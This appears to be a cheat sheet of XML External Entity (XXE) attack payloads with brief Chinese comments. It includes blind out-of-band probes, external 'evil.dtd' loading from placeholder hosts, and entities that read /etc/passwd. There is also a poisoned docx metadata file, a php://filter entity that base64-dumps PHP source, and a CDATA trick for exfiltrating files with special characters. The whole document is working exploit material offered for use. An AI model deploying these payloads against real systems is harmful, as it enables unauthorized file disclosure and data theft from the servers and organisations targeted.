```xml
<!-- https://gist.github.com/staaldraad/01415b990939494879b4 -->

<!-- used to verify outbound xxe or blind xxe -->
<?xml verion="1.0"?>
<!DOCTYPE r [
<!ELEMENT r ANY>
<!ENTITY sp SYSTEM "http://x.x.x.x:443/test.txt">
]>
<r>&sp;</r>


<?xml version='1.0'?>
<!DOCTYPE a[
    <!ENTITY % d SYSTEM "http://x.x.x.x/evil.dtd">
    %d;
]>
<c>&d;</c>
evil.dtd:  
<!ENTITY d SYSTEM "file:///etc/passwd">



<!-- docx利用普通XXE读取文件/访问网络 -->

<?xml version="1.0" encoding="UTF-8" standalone="yes"?>
<!DOCTYPE ANY [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>

<cp:coreProperties
    xmlns:cp="http://schemas.openxmlformats.org/package/2006/metadata/core-properties"
    xmlns:dc="http://purl.org/dc/elements/1.1/"
    xmlns:dcterms="http://purl.org/dc/terms/"
    xmlns:dcmitype="http://purl.org/dc/dcmitype/"
    xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance">
    <dc:title>Try asdf! &xxe;</dc:title>
    <dc:subject></dc:subject>
    <dc:creator></dc:creator>
    <cp:keywords></cp:keywords>
    <dc:description></dc:description>
    <cp:lastModifiedBy></cp:lastModifiedBy>
    <cp:revision>1</cp:revision>
    <dcterms:created xsi:type="dcterms:W3CDTF">2015-08-01T19:00:00Z</dcterms:created>
    <dcterms:modified xsi:type="dcterms:W3CDTF">2019-01-15T14:28:00Z</dcterms:modified>
</cp:coreProperties>
 
 <!DOCTYPE a [<!ENTITY % b SYSTEM "http://127.0.0.1:8088/evil.txt">%b;]>

<!DOCTYPE ANY [<!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=upload_docx.php">]>

<!-- 所读取文件中含有特殊字符如&等 -->
<?xml version="1.0" encoding="utf-8"?> 
<!DOCTYPE roottag [
<!ENTITY % start "<![CDATA[ ">
<!ENTITY % goodies SYSTEM "file:///var/www/test.txt">
<!ENTITY % end "]]>">
<!ENTITY % dtd SYSTEM "http://x.x.x.x/evil.txt">
%dtd;
]> 

<roottag>&all;</roottag>

evil.txt:
<!ENTITY all "%start;%goodies;%end;">



```